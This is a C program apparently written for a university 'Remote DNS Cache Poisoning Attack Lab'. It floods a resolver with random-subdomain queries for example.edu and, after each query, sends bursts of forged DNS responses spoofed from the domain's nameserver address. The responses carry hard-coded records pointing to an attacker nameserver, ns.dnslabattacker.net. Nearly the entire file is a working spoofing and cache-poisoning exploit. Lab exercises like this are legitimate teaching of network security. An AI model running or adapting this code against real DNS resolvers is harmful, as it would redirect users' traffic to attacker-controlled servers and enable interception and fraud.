// ----udp.c------
// For use with the Remote DNS Cache Poisoning Attack Lab
// Sample program used to spoof lots of different DNS queries to the victim.
//
// Wireshark can be used to study the packets, however, the DNS queries 
// sent by this program are not enough for to complete the lab.
//
// The response packet needs to be completed.
//
// Compile command:
// gcc udp.c -o udp
//
// The program must be run as root
// sudo ./udp

#include <unistd.h>
#include <stdio.h>
#include <sys/socket.h>
#include <netinet/ip.h>
#include <netinet/udp.h>
#include <arpa/inet.h>
#include <fcntl.h>
#include <string.h>
#include <errno.h>
#include <stdlib.h>

// The packet length
#define PCKT_LEN 8192
#define FLAG_R 0x8400
#define FLAG_Q 0x0100

// The IP header's structure
struct ipheader {
    unsigned char      iph_ihl:4, iph_ver:4;
    unsigned char      iph_tos;
    unsigned short int iph_len;
    unsigned short int iph_ident;
    unsigned short int iph_offset;
    unsigned char      iph_ttl;
    unsigned char      iph_protocol;
    unsigned short int iph_chksum;
    unsigned int       iph_sourceip;
    unsigned int       iph_destip;
};

// UDP header's structure
struct udpheader {
    unsigned short int udph_srcport;
    unsigned short int udph_destport;
    unsigned short int udph_len;
    unsigned short int udph_chksum;

};
struct dnsheader {
    unsigned short int query_id;
    unsigned short int flags;
    unsigned short int QDCOUNT;
    unsigned short int ANCOUNT;
    unsigned short int NSCOUNT;
    unsigned short int ARCOUNT;
};
// This structure just for convinience in the DNS packet, because such 4 byte data often appears. 
struct dataEnd{
    unsigned short int  type;
    unsigned short int  class;
};
// total udp header length: 8 bytes (=64 bits)

// dns response packet
struct dnsresponse {
    unsigned short int transaction_id;
    unsigned short int flags;
    unsigned short int QDCOUNT; // number of questions in the response
    unsigned short int ANCOUNT; // number of answer RRs in the response
    unsigned short int NSCOUNT; // ??
    unsigned short int ARCOUNT; // number of authority RRs in the response
};

unsigned int checksum(uint16_t *usBuff, int isize)
{
    unsigned int cksum=0;
    for(;isize>1;isize-=2){
        cksum+=*usBuff++;
    }
    if(isize==1){
        cksum+=*(uint16_t *)usBuff;
    }
    return (cksum);
}

// calculate udp checksum
uint16_t check_udp_sum(uint8_t *buffer, int len)
{
    unsigned long sum=0;
    struct ipheader *tempI=(struct ipheader *)(buffer);
    struct udpheader *tempH=(struct udpheader *)(buffer+sizeof(struct ipheader));
    struct dnsheader *tempD=(struct dnsheader *)(buffer+sizeof(struct ipheader)+sizeof(struct udpheader));
    tempH->udph_chksum=0;
    sum=checksum((uint16_t *)&(tempI->iph_sourceip),8);
    sum+=checksum((uint16_t *)tempH,len);
    sum+=ntohs(IPPROTO_UDP+len);
    sum=(sum>>16)+(sum & 0x0000ffff);
    sum+=(sum>>16);
    return (uint16_t)(~sum);
}
// Function for checksum calculation. From the RFC791,
// the checksum algorithm is:
//  "The checksum field is the 16 bit one's complement of the one's
//  complement sum of all 16 bit words in the header.  For purposes of
//  computing the checksum, the value of the checksum field is zero."
unsigned short csum(unsigned short *buf, int nwords)
{
    unsigned long sum;
    for(sum=0; nwords>0; nwords--)
        sum += *buf++;
    sum = (sum >> 16) + (sum &0xffff);
    sum += (sum >> 16);
    return (unsigned short)(~sum);
}

void fake_buffer_content(char * buffer, int offset){
    buffer[offset] = 0xc0;
    buffer[offset+1] = 0x0c;
    buffer[offset+2] = 0x00;
    buffer[offset+3] = 0x01;
    buffer[offset+4] = 0x00;
    buffer[offset+5] = 0x01;
    buffer[offset+6] = 0x02;
    buffer[offset+7] = 0x00;
    buffer[offset+8] = 0x00;
    buffer[offset+9] = 0x00;
    buffer[offset+10] = 0x00;
    buffer[offset+11] = 0x04;
    buffer[offset+12] = 0x01;
    buffer[offset+13] = 0x01;
    buffer[offset+14] = 0x01;
    buffer[offset+15] = 0x01;
    buffer[offset+16] = 0xc0;
    buffer[offset+17] = 0x12;
    buffer[offset+18] = 0x00;
    buffer[offset+19] = 0x02;
    buffer[offset+20] = 0x00;
    buffer[offset+21] = 0x01;
    buffer[offset+22] = 0x02;
    buffer[offset+23] = 0x00;
    buffer[offset+24] = 0x00;
    buffer[offset+25] = 0x00;
    buffer[offset+26] = 0x00;
    buffer[offset+27] = 0x17;
    buffer[offset+28] = 0x02;
    buffer[offset+29] = 0x6e;
    buffer[offset+30] = 0x73;
    buffer[offset+31] = 0x0e;
    buffer[offset+32] = 0x64;
    buffer[offset+33] = 0x6e;
    buffer[offset+34] = 0x73;
    buffer[offset+35] = 0x6c;
    buffer[offset+36] = 0x61;
    buffer[offset+37] = 0x62;
    buffer[offset+38] = 0x61;
    buffer[offset+39] = 0x74;
    buffer[offset+40] = 0x74;
    buffer[offset+41] = 0x61;
    buffer[offset+42] = 0x63;
    buffer[offset+43] = 0x6b;
    buffer[offset+44] = 0x65;
    buffer[offset+45] = 0x72;
    buffer[offset+46] = 0x03;
    buffer[offset+47] = 0x6e;
    buffer[offset+48] = 0x65;
    buffer[offset+49] = 0x74;
    buffer[offset+50] = 0x00;
    buffer[offset+51] = 0x02;
    buffer[offset+52] = 0x6e;
    buffer[offset+53] = 0x73;
    buffer[offset+54] = 0x0e;
    buffer[offset+55] = 0x64;
    buffer[offset+56] = 0x6e;
    buffer[offset+57] = 0x73;
    buffer[offset+58] = 0x6c;
    buffer[offset+59] = 0x61;
    buffer[offset+60] = 0x62;
    buffer[offset+61] = 0x61;
    buffer[offset+62] = 0x74;
    buffer[offset+63] = 0x74;
    buffer[offset+64] = 0x61;
    buffer[offset+65] = 0x63;
    buffer[offset+66] = 0x6b;
    buffer[offset+67] = 0x65;
    buffer[offset+68] = 0x72;
    buffer[offset+69] = 0x03;
    buffer[offset+70] = 0x6e;
    buffer[offset+71] = 0x65;
    buffer[offset+72] = 0x74;
    buffer[offset+73] = 0x00;
    buffer[offset+74] = 0x00;
    buffer[offset+75] = 0x01;
    buffer[offset+76] = 0x00;
    buffer[offset+77] = 0x01;
    buffer[offset+78] = 0x02;
    buffer[offset+79] = 0x00;
    buffer[offset+80] = 0x00;
    buffer[offset+81] = 0x00;
    buffer[offset+82] = 0x00;
    buffer[offset+83] = 0x04;
    buffer[offset+84] = 0x01;
    buffer[offset+85] = 0x01;
    buffer[offset+86] = 0x01;
    buffer[offset+87] = 0x01;
    buffer[offset+88] = 0x00;
    buffer[offset+89] = 0x00;
    buffer[offset+90] = 0x29;
    buffer[offset+91] = 0x10;
    buffer[offset+92] = 0x00;
    buffer[offset+93] = 0x00;
    buffer[offset+94] = 0x00;
    buffer[offset+95] = 0x88;
    buffer[offset+96] = 0x00;
    buffer[offset+97] = 0x00;
    buffer[offset+98] = 0x00;
}

char *SERVER = "192.168.15.6";
char *ATTACKER = "192.168.15.8";
char *EXAMPLE_EDU = "199.43.133.53";

int main(int argc, char *argv[])
{
    // socket descriptor
    int sd;
    int sd_fake;


    // buffer to hold the packet
    char buffer[PCKT_LEN];
    char buffer_fake[PCKT_LEN];

    // set the buffer to 0 for all bytes
    memset(buffer, 0, PCKT_LEN);
    memset(buffer_fake,0,PCKT_LEN);

    // Our own headers' structures
    struct ipheader *ip = (struct ipheader *)buffer;
    struct udpheader *udp = (struct udpheader *)(buffer + sizeof(struct ipheader));
    struct dnsheader *dns=(struct dnsheader*)(buffer +sizeof(struct ipheader)+
        sizeof(struct udpheader));

    struct ipheader *ip_fake = (struct ipheader *)buffer_fake;
    struct udpheader *udp_fake = (struct udpheader *)(buffer_fake + 
        sizeof(struct ipheader));
    struct dnsheader *dns_fake =(struct dnsheader*)(buffer_fake +
        sizeof(struct ipheader)+sizeof(struct udpheader));

    // data is the pointer points to the first byte of the dns payload  
    char *data=(buffer +sizeof(struct ipheader)+sizeof(struct udpheader)+
        sizeof(struct dnsheader));
    char *data_fake=(buffer_fake +sizeof(struct ipheader)+sizeof(struct udpheader)
        +sizeof(struct dnsheader));

    //The flag you need to set
    dns->flags=htons(FLAG_Q);
    dns_fake->flags=htons(FLAG_R);
    
    //only 1 query, so the count should be one.
    dns->QDCOUNT=htons(1);

    dns_fake->QDCOUNT=htons(1);
    dns_fake->ANCOUNT=htons(1);
    dns_fake->NSCOUNT=htons(1);
    dns_fake->ARCOUNT=htons(1);

    //query string
    strcpy(data,"\5aaaaa\7example\3edu");
    int length= strlen(data)+1;
    struct dataEnd * end=(struct dataEnd *)(data+length);
    end->type=htons(1);
    end->class=htons(1);

    strcpy(data_fake,"\5aaaaa\7example\3edu");
    int length_fake = strlen(data)+1;
    struct dataEnd * end_fake=(struct dataEnd *)(data_fake + length_fake);
    end_fake->type=htons(1);
    end_fake->class=htons(1);

    int offset = sizeof(struct ipheader) + sizeof(struct udpheader) + 
        sizeof(struct dnsheader) + length_fake + sizeof(struct dataEnd);
    // Creat the content of the fake buffer
    fake_buffer_content( buffer_fake, offset);

    struct sockaddr_in sin, din;
    struct sockaddr_in sin_fake, din_fake;
    int one = 1;
    const int *val = &one;
    dns->query_id=rand(); // transaction ID for the query packet, use random #

    // Create a raw socket with UDP protocol
    sd = socket(PF_INET, SOCK_RAW, IPPROTO_UDP);
    sd_fake = socket(PF_INET, SOCK_RAW, IPPROTO_UDP);

    if(sd<0) // if socket fails to be created 
        printf("socket error\n");
    if(sd_fake<0) // if socket fails to be created 
        printf("sd_fake socket error\n");

    // The source is redundant, may be used later if needed
    // The address family
    sin.sin_family = AF_INET;
    din.sin_family = AF_INET;
    sin_fake.sin_family = AF_INET;
    din_fake.sin_family = AF_INET;

    // Port numbers
    sin.sin_port = htons(33333);
    din.sin_port = htons(53);
    
    sin_fake.sin_port = htons(53); 
    din_fake.sin_port = htons(33333);

    // IP addresses
    sin.sin_addr.s_addr = inet_addr(SERVER); 
    din.sin_addr.s_addr = inet_addr(ATTACKER); 

    sin_fake.sin_addr.s_addr = inet_addr(SERVER);
    din_fake.sin_addr.s_addr = inet_addr(EXAMPLE_EDU);

    // Fabricate the IP header or we can use the
    // standard header structures but assign our own values.
    ip->iph_ihl = 5;
    ip->iph_ver = 4;
    ip->iph_tos = 0; // Low delay
    ip_fake->iph_ihl = 5;
    ip_fake->iph_ver = 4;
    ip_fake->iph_tos = 0; // Low delay

    unsigned short int packetLength =(sizeof(struct ipheader) +
        sizeof(struct udpheader)+sizeof(struct dnsheader)+length+
        sizeof(struct dataEnd)); // length + dataEnd_size == UDP_payload_size

    ip->iph_len=htons(packetLength);
    ip->iph_ident = htons(rand()); // give a random number for the identification#
    ip->iph_ttl = 110; // hops
    ip->iph_protocol = 17; // UDP

    unsigned short int packetLength_fake =(sizeof(struct ipheader) +
        sizeof(struct udpheader)+sizeof(struct dnsheader)+length_fake+
        sizeof(struct dataEnd)+99); // length + dataEnd_size == UDP_payload_size

    ip_fake->iph_len=htons(packetLength_fake);
    ip_fake->iph_ident = htons(rand()); // give a random number for the identification#
    ip_fake->iph_ttl = 110; // hops
    ip_fake->iph_protocol = 17; // UDP

    // Source IP address, can use spoofed address here!!!
    ip->iph_sourceip = inet_addr(ATTACKER);
    ip_fake->iph_sourceip = inet_addr(EXAMPLE_EDU);

    // The destination IP address
    ip->iph_destip = inet_addr(SERVER);
    ip_fake->iph_destip = inet_addr(SERVER);

    // Fabricate the UDP header. Source port number, redundant
    udp->udph_srcport = htons(33333);  // source port number. remember the lower number may be reserved
    udp_fake->udph_srcport = htons(53);  // source port number. remember the lower number may be reserved
    
    // Destination port number
    udp->udph_destport = htons(53);
    udp_fake->udph_destport = htons(33333); 

    udp->udph_len = htons(sizeof(struct udpheader)+sizeof(struct dnsheader)+
        length+sizeof(struct dataEnd));
    udp_fake->udph_len = htons(sizeof(struct udpheader)+sizeof(struct dnsheader)+
        length+sizeof(struct dataEnd)+99); 

    // Calculate the checksum for integrity
    ip->iph_chksum = csum((unsigned short *)buffer, sizeof(struct ipheader) + 
        sizeof(struct udpheader));
    ip_fake->iph_chksum = csum((unsigned short *)buffer_fake, sizeof(struct ipheader) +
        sizeof(struct udpheader));

    udp->udph_chksum=check_udp_sum(buffer, packetLength-sizeof(struct ipheader));
    udp_fake->udph_chksum=check_udp_sum(buffer_fake, 
        packetLength_fake-sizeof(struct ipheader));    
    
    // Inform the kernel to not fill up the packet structure. we will build our own...
    if(setsockopt(sd, IPPROTO_IP, IP_HDRINCL, val, sizeof(one))<0 ) {
        printf("error\n");  
        exit(-1);
    }
    if(setsockopt(sd_fake, IPPROTO_IP, IP_HDRINCL, val, sizeof(one))<0 ) {
        printf("error\n");  
        exit(-1);
    }

    int j; 
    while (1) {  
        // This is to generate a different query in xxxxx.example.edu
        //   NOTE: this will have to be updated to only include printable characters
        int charnumber;
        charnumber=1+rand()%5;
        *(data+charnumber)+=1;
        *(data_fake+charnumber)+=1;

        udp->udph_chksum=check_udp_sum(buffer, packetLength-sizeof(struct ipheader)); // recalculate the checksum for the UDP packet

        // send the packet out.
        if(sendto(sd, buffer, packetLength, 0, (struct sockaddr *)&sin, sizeof(sin)) < 0)
            printf("packet send error %d which means %s\n",errno,strerror(errno));

        for (j=0;j<200;j++) {
            dns_fake->query_id = htons(rand()%(65536));
            udp_fake->udph_chksum=check_udp_sum(buffer_fake, 
                packetLength_fake-sizeof(struct ipheader));
            if (sendto(sd_fake, buffer_fake, packetLength_fake, 0, (struct sockaddr *)&sin_fake, sizeof(sin_fake)) < 0)
                printf("packet send error %d which means %s\n",errno,strerror(errno));
        }
    }
    close(sd);
    close(sd_fake);
    printf("--- Done ---\n");
    return 0;
}
